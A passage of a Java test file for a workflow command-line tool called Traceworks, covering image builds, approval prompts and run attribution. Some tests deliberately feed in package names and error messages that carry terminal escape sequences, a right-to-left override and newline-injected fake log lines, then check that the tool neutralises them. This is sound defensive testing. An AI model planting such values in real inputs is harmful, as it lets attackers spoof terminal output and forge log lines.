                + "then go on with:" + padding + sentence + "\",\"options\":[\"Yes\",\"No\"]}}");

        Result parked = runHost(pkg);

        assertThat(parked.code()).as(parked.out() + parked.err()).isEqualTo(5);
        List<String> question = printedOut.lines().dropWhile(line -> !line.startsWith("waiting for an answer"))
                .skip(1).takeWhile(line -> !line.equals("answer it with one of:")).toList();
        assertThat(question).as(printedOut).hasSizeGreaterThan(3).allSatisfy(line ->
                assertThat(line).startsWith("  |").hasSizeLessThanOrEqualTo(80));
        assertThat(question).as("the first part of a line, and the parts it goes on with")
                .contains("  | ok?", "  |+ then go on with:");
        assertThat(String.join(" ", question.stream().map(line -> line.substring(4).strip()).toList()))
                .as("nothing of the question is lost, and a break is at a blank").contains(sentence);
    }

    // ---- images ----

    @Test
    void imagesBuild_withoutAPackage_buildsTheBuiltInImages_shellFirst() {
        var runtime = new FakeContainerRuntime();

        Result r = execWith(runtime, null, "images", "build");

        assertThat(r.code()).as(r.out() + r.err()).isZero();
        assertThat(r.out().lines().toList()).hasSize(4);
        assertThat(r.out().lines().map(l -> l.replaceAll(":[0-9a-f]{12}$", ":H")).toList()).containsExactly(
                "built traceworks/shell:H", "built traceworks/claude:H", "built traceworks/pi:H",
                "built traceworks/egress:H");
        assertThat(runtime.built()).hasSize(4);
    }

    @Test
    void imagesBuild_withAPackage_buildsTheShellImage_itsImages_andPullsItsRegistryImages() throws IOException {
        Path pkg = pkg("imaged", """
                {"type":"shell","name":"a","config":{"command":"true","container_image":"alpine:3"}},
                {"type":"shell","name":"b","config":{"command":"true","container_image":"./images/tools"}}""");
        Files.createDirectories(pkg.resolve("images/tools"));
        Files.writeString(pkg.resolve("images/tools/Dockerfile"), "FROM scratch\n");
        var runtime = new FakeContainerRuntime();

        Result r = execWith(runtime, null, "images", "build", pkg.toString());

        assertThat(r.code()).as(r.out() + r.err()).isZero();
        assertThat(r.out()).containsPattern("(?m)^built traceworks/shell:[0-9a-f]{12}$")
                .containsPattern("(?m)^built traceworks-pkg/imaged/tools:[0-9a-f]{12}$").contains("pulled alpine:3");
        assertThat(runtime.built()).as("no AI step, so no AI image").hasSize(2);
        assertThat(runtime.pulled()).containsExactly("alpine:3");
    }

    /**
     * A directory under images/ with a Dockerfile and a name that is not valid is named by images build (exit 6, the
     * other images still built), by check, and by the start check of a run that names it.
     */
    @Test
    void anImageDirectoryWhoseNameIsNotValid_isNamed_byImagesBuild_check_andTheStartCheck() throws IOException {
        Path pkg = pkg("invalid", """
                {"type":"shell","name":"a","config":{"command":"true","container_image":"./images/MyTool"}}""");
        Files.writeString(pkg.resolve("workflow.json"), Files.readString(pkg.resolve("workflow.json"))
                .replace("\"blocks\"", "\"requires\":[\"package.images\"],\"blocks\""));
        Files.createDirectories(pkg.resolve("images/MyTool"));
        Files.writeString(pkg.resolve("images/MyTool/Dockerfile"), "FROM scratch\n");
        var runtime = new FakeContainerRuntime();

        Result build = execWith(runtime, null, "images", "build", pkg.toString());
        Result check = exec("check", pkg.toString());
        Result run = execWith(runtime, null, "run", pkg.toString(), "--no-input");

        assertThat(build.code()).isEqualTo(6);
        assertThat(build.out()).doesNotContain("nothing to build").containsPattern("(?m)^built traceworks/shell:");
        assertThat(build.err()).contains("images/MyTool", "\"MyTool\" is not a valid package image name");
        assertThat(check.out()).contains("WARNING", "invalid-image-name", "images/MyTool");
        assertThat(run.code()).isEqualTo(6);
        assertThat(run.err()).contains("./images/MyTool: \"MyTool\" is not a valid package image name"
                + " ([a-z0-9][a-z0-9._-]*)").doesNotContain("has no Dockerfile");
    }

    @Test
    void imagesBuild_whenTheRuntimeFails_exits6_withItsError() throws IOException {
        var runtime = org.mockito.Mockito.mock(ContainerRuntime.class);
        org.mockito.Mockito.doThrow(new IOException("docker build failed: denied")).when(runtime)
                .build(org.mockito.ArgumentMatchers.anyString(), org.mockito.ArgumentMatchers.anyString());

        Result r = execWith(runtime, null, "images", "build");

        assertThat(r.code()).isEqualTo(6);
        assertThat(r.err()).contains("docker build failed: denied");
        assertThat(r.err().lines().filter(l -> l.startsWith("traceworks: failed to build traceworks/")))
                .as("every image is tried").hasSize(4);
    }

    /**
     * A failure names the image as the package wrote it and carries the runtime's output, several lines of it. Every
     * line after the first is marked, so none of them can pass for a line of Traceworks.
     */
    @Test
    void imagesBuild_marksEveryFurtherLineOfAFailure_soNoneReadsAsALineOfTraceworks() throws IOException {
        Path pkg = pkg("forging", """
                {"type":"shell","name":"a","config":{"command":"true","container_image":"x\\ntraceworks: done"}}""");
        var runtime = org.mockito.Mockito.mock(ContainerRuntime.class);
        org.mockito.Mockito.doThrow(new IOException("docker pull failed with exit code 1:\ntraceworks: all good"))
                .when(runtime).pull(org.mockito.ArgumentMatchers.anyString());

        Result r = execWith(runtime, null, "images", "build", pkg.toString());

        assertThat(r.code()).isEqualTo(6);
        assertThat(r.err().lines().toList()).containsExactly("traceworks: failed to pull x",
                "traceworks:   | traceworks: done: docker pull failed with exit code 1:",
                "traceworks:   | traceworks: all good");
    }

    @Test
    void images_usageErrors_exit2() {
        assertThat(exec("images").code()).isEqualTo(2);
        assertThat(exec("images", "pull").code()).isEqualTo(2);
        assertThat(exec("images", "build", temp.resolve("nowhere").toString()).code()).isEqualTo(2);
    }

    @Test
    void check_warnsAboutAnUnpinnedBaseImage() throws IOException {
        Path pkg = plainPackage();
        Files.createDirectories(pkg.resolve("images/tools"));
        Files.writeString(pkg.resolve("images/tools/Dockerfile"), "FROM node:22-slim\n");

        Result r = exec("check", pkg.toString());

        assertThat(r.code()).isZero();
        assertThat(r.out()).contains("WARNING", "unpinned-base-image", "node:22-slim");
    }

    @Test
    void home_isAlsoAcceptedBeforeTheCommand() throws IOException {
        runHost(plainPackage(), "--quiet");

        Result r = exec("--home", home.toString(), "runs");

        assertThat(r.code()).isZero();
        assertThat(r.out()).contains("COMPLETED");
        assertThat(exec("--home=" + home, "runs").out()).contains("COMPLETED");
    }

    @Test
    void aQuestionThatDoesNotPark_withoutATerminal_printsTheHint_andTheInboxAnswersIt() throws Exception {
        Path parent = pkg("nested", """
                {"type":"sub-workflow","name":"child","config":{"workflow_id":"./child"}},
                {"type":"shell","name":"after","config":{"command":"echo after"}}""");
        Files.createDirectories(parent.resolve("child"));
        Files.writeString(parent.resolve("child/workflow.json"), """
                {"id":"child","name":"child","blocks":[
                 {"type":"approval","name":"confirm","config":{"question":"Go on?","options":["Yes","No"]}}]}""");
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        PrintStream stream = new PrintStream(out, true, StandardCharsets.UTF_8);
        java.util.concurrent.CompletableFuture<Integer> running = OwnThread.start("run of the parent",
                () -> Main.run(new String[] {"run", parent.toString(), "--allow-host-execution", "--no-input",
                        "--home", home.toString()}, stream, stream, Map.of("TRACEWORKS_ACTOR", "tester"), work, null,
                        RuntimeSource.NONE));
        Matcher hint = null;
        long end = System.nanoTime() + 20_000_000_000L;
        while (System.nanoTime() < end) {
            hint = Pattern.compile("waiting for an answer: traceworks approve '([0-9a-f-]{36})' --answer 'Yes'")
                    .matcher(out.toString(StandardCharsets.UTF_8));
            if (hint.find()) {
                break;
            }
            hint = null;
            Thread.sleep(50);
        }
        assertThat(hint).as(out.toString(StandardCharsets.UTF_8)).isNotNull();

        Result approve = exec("approve", hint.group(1), "--answer", "Yes");

        assertThat(approve.code()).as(approve.err()).isZero();
        assertThat(running.get(20, java.util.concurrent.TimeUnit.SECONDS)).isZero();
        assertThat(out.toString(StandardCharsets.UTF_8)).contains("output: after");
    }

    @Test
    void namesAndOptionsFromAPackage_areNeutralisedEverywhere() throws IOException {
        Path dir = Files.createDirectories(temp.resolve("evil"));
        Files.writeString(dir.resolve("workflow.json"), "{\"id\":\"evil\",\"name\":\"Evil\\u001b]0;x\\u0007\\u202e\","
                + "\"blocks\":[{\"type\":\"approval\",\"name\":\"ask\\u001b[2J\","
                + "\"config\":{\"question\":\"Go?\",\"options\":[\"Y\\u001b]0;x\\u0007\\u202e\",\"No\"]}}]}");

        Result run = runHost(dir);
        String id = idOf(run);
        Result show = exec("show", id);
        Result runs = exec("runs");

        for (String text : List.of(run.out(), show.out(), runs.out())) {
            assertThat(text).doesNotContain("\u001b", "\u0007", "\u202e");
        }
        assertThat(show.out()).contains("Evil?]0;x");
    }

    @Test
    void aParkingQuestion_getsNoWaitingHint() throws IOException {
        assertThat(runHost(approvalPackage()).out()).doesNotContain("waiting for an answer: ");
    }

    @Test
    void relativePaths_resolveAgainstTheWorkingDirectory() throws IOException {
        Path inside = Files.createDirectories(work.resolve("pkg"));
        Files.writeString(inside.resolve("workflow.json"),
                "{\"id\":\"rel\",\"name\":\"rel\",\"blocks\":[{\"type\":\"shell\",\"name\":\"s\",\"config\":{\"command\":\"true\"}}]}");

        assertThat(exec("check", "pkg").code()).isZero();
    }

    @Test
    void home_comesFromTheFlag_thenTheEnvironment() throws IOException {
        Path other = Files.createDirectories(temp.resolve("env-home"));
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        PrintStream stream = new PrintStream(out, true, StandardCharsets.UTF_8);
        int code = Main.run(new String[] {"run", plainPackage().toString(), "--allow-host-execution", "--no-input",
                "--quiet"}, stream, stream, Map.of("TRACEWORKS_HOME", other.toString()), work, null,
                RuntimeSource.NONE);

        assertThat(code).isZero();
        assertThat(other.resolve("runs")).isDirectory();
        assertThat(home.resolve("runs")).doesNotExist();
    }

    /** Without TRACEWORKS_ACTOR and without an actor in the config, a run is attributed to the user at this host. */
    @Test
    void aRunWithoutAnActorSetting_isAttributedToTheUserAtTheHost() throws IOException {
        env.remove("TRACEWORKS_ACTOR");

        String id = idOf(runHost(plainPackage(), "--quiet"));

        String started = Files.readAllLines(runFolder(id).resolve("events.jsonl")).getFirst();
        assertThat(new com.fasterxml.jackson.databind.ObjectMapper().readTree(started).path("actor").asText())
                .matches(Pattern.quote(System.getProperty("user.name")) + "@[^@\\s]+");
    }
}
